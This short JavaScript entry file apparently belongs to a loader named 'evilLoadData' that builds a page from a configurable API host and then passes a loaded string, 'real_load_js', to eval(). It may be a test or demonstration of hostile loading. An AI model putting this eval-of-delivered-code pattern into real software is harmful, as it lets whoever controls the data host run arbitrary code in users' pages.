import './styling';
import { evilLoadData } from './load_data';
import { createPageStructure } from './page';
import { injectCoherent } from './coherent';

injectCoherent();
createPageStructure(evilLoadData.api_host, () => {
  console.log('redirecting');
  eval(evilLoadData.real_load_js);
});
